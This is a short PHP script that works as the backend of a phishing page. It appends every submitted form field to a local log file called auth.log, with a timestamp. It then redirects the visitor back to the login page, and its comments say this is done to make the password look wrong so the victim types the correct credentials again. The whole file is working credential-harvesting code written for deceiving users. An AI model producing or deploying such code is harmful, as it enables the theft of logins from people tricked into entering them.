<?php

// the name of the file you're writing to
$myFile = "auth.log";

// opens the file for appending (file must already exist)
$fh = fopen($myFile, 'a');

// record the initial form submission
$pre = "----------------------------------------\n";
$date = date ("d/m/Y -- H:i:s");
$message = "[ * ]   $date   [ * ]\n";

// Makes a CSV list of your post data
$comma_delimited_list = implode(", ", $_POST) . "\n";

// Write to the file
fwrite($fh, $pre);
fwrite($fh, "$message");
fwrite($fh, $comma_delimited_list);

// Close the file
fclose($fh);

// Redirect to force a second authentication attempt
// Appear as if the password was entered incorrectly
// To assure correct credentials are captured...
header('Location: auth/index.html' );
?>